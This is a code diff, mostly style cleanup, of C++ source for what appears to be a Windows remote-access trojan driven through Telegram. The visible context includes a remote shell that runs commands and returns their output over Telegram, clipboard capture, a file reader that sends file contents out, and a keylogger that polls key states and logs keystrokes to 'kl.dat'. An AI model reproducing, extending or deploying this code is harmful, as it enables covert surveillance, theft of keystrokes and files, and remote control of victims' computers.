@@ -269,7 +269,7 @@ void hotkeys(std::string hotkey) {
             else if (buff == "downarrow") tools::pressSpecialKey(VK_DOWN, 0);
             else if (buff == "leftarrow") tools::pressSpecialKey(VK_LEFT, 0);
             else if (buff == "rightarrow") tools::pressSpecialKey(VK_RIGHT, 0);
-            else if (buff == "lmouse") tools::pressSpecialKey(VK_LBUTTON, 0);;
+            else if (buff == "lmouse") tools::pressSpecialKey(VK_LBUTTON, 0);
 
             buff.clear();
         }
@@ -333,7 +333,7 @@ void SendClipboard(std::string) {
         clip = GetClipboardData(CF_TEXT);
     else if (IsClipboardFormatAvailable(CF_UNICODETEXT))
         clip = GetClipboardData(CF_UNICODETEXT);
-  
+
     CloseClipboard();
 
     char* buff = reinterpret_cast<char*>(clip);
@@ -591,18 +591,17 @@ void shell(std::string) {
         if (pm.ID == "cd") {
             if (pm.command.empty()) {
                 telegram::SendText("Current Directory: " + fs::current_path().generic_string());
-            } else if(pm.command == "..") {
+            } else if (pm.command == "..") {
                 fs::current_path(fs::current_path().parent_path());
-            }
-            else {
+            } else {
                 fs::current_path(pm.command + " " + pm.parameters);
             }
             continue;
         }
 
-        if (pm.ID == "quit") 
+        if (pm.ID == "quit")
             return;
-        
+
         if (pm.ID == "ls") {
             ListOfFiles(command.substr(2, command.size()));
             continue;
@@ -612,7 +611,7 @@ void shell(std::string) {
             cat(pm.command);
             continue;
         }
-       
+
         telegram::SendText(tools::info::cmdOutput(command.c_str()));
     }
 }
@@ -633,7 +632,7 @@ void cat(std::string path) {
     while (std::getline(f, line)) {
         output += line + "\n";
     }
-    
+
     f.close();
 
     telegram::SendText(output);
@@ -652,7 +651,7 @@ void cat(std::string path) {
 */
 bool toggle_keylogger = false;
 std::thread keylogger_t;
-const std::string KEYLOGGER_FILENAME = "kl.dat";
+const char KEYLOGGER_FILENAME[] = "kl.dat";
 
 void LOG(std::string input) {
     std::fstream LogFile;
@@ -715,11 +714,9 @@ bool SpecialKeys(int S_Key) {
 void keyloggerInstance() {
     while (toggle_keylogger) {
         Sleep(10);
-        for (int KEY = 8; KEY <= 190; KEY++)
-        {
+        for (int KEY = 8; KEY <= 190; KEY++) {
             if (GetAsyncKeyState(KEY) == -32767) {
                 if (SpecialKeys(KEY) == false) {
-
                     std::fstream LogFile;
                     LogFile.open(KEYLOGGER_FILENAME, std::fstream::app);
                         LogFile << char(KEY);
